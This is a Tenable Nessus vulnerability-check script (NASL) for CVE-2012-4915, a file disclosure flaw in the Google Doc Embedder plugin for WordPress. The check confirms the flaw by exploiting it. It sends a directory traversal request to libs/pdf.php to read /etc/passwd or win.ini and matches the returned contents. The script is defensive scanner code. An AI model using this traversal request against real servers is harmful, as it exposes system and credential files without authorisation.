#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(63687);
  script_version("$Revision: 1.4 $");
  script_cvs_date("$Date: 2015/09/24 23:21:23 $");

  script_cve_id("CVE-2012-4915");
  script_bugtraq_id(57133);
  script_osvdb_id(88891);

  script_name(english:"Google Doc Embedder Plugin for WordPress 'File' Parameter Traversal Arbitrary File Disclosure");
  script_summary(english:"Attempts to read a local file.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by a file
disclosure vulnerability.");
  script_set_attribute(attribute:"description", value:
"The Google Doc Embedder Plugin for WordPress installed on the remote
host is affected by a file disclosure vulnerability due to a failure
to properly sanitize user-supplied input to the 'file' parameter of
the 'libs/pdf.php' script. This vulnerability could allow an
unauthenticated, remote attacker to read arbitrary files by forming a
request containing directory traversal sequences.");
  # http://ceriksen.com/2013/01/03/wordpress-google-document-embedder-arbitrary-file-disclosure/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?369b2772");
  script_set_attribute(attribute:"solution", value:"Upgrade to Google Doc Embedder version 2.5 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'WordPress Plugin Google Document Embedder Arbitrary File Disclosure');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/01/03");
  script_set_attribute(attribute:"patch_publication_date", value:"2012/12/11");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/01/24");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:wordpress:wordpress");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2013-2015 Tenable Network Security, Inc.");

  script_dependencies("wordpress_detect.nasl");
  script_require_keys("installed_sw/WordPress", "www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

app = "WordPress";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

plugin = 'Google Doc Embedder';

# Check KB first
installed = get_kb_item("www/"+port+"/webapp_ext/"+plugin+" under "+dir);

if (!installed)
{
  checks = make_array();
  path = "/wp-content/plugins/";
  checks[path + "google-document-embedder/js/editor_plugin.js"][0] =
    make_list("longname : 'Google Doc Embedder'");

  # Ensure plugin is installed
  installed = check_webapp_ext(
    checks : checks,
    dir    : dir,
    port   : port,
    ext    : plugin
  );
}
if (!installed)
  audit(AUDIT_WEB_APP_EXT_NOT_INST, app, install_url, plugin + " plugin");

# Determine what to look for.
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os) files = make_list('windows/win.ini', 'winnt/win.ini');
  else files = make_list('etc/passwd');
}
else files = make_list('etc/passwd', 'windows/win.ini', 'winnt/win.ini');

file_pats = make_array();
file_pats['etc/passwd'] = "root:.*:0:[01]:";
file_pats['winnt/win.ini'] = "^\[[a-zA-Z]+\]|^; for 16-bit app support";
file_pats['windows/win.ini'] = "^\[[a-zA-Z]+\]|^; for 16-bit app support";

foreach file (files)
{
  url = "/wp-content/plugins/google-document-embedder/libs/pdf.php?fn=foo.pdf"+
    "&file=" + mult_str(str:"../", nb:12) + file;

  res = http_send_recv3(
    method    : "GET",
    item      : dir + url,
    port         : port,
    exit_on_fail : TRUE
  );

  if (egrep(pattern:file_pats[file], string:res[2]))
  {
    if (report_verbosity > 0)
    {
      snip =  crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30);
      report =
        '\nNessus was able to verify the issue exists using the following request :' +
        '\n' +
        '\n' + install_url + url +
        '\n';
      if (report_verbosity > 1)
      {
        report +=
          '\n' + 'This produced the following output :' +
          '\n' +
          '\n' + snip +
          '\n' + chomp(res[2]) +
          '\n' + snip +
          '\n';
      }
      security_warning(port:port, extra:report);
    }
    else security_warning(port);
    exit(0);
  }
}
audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, install_url, plugin + " plugin");
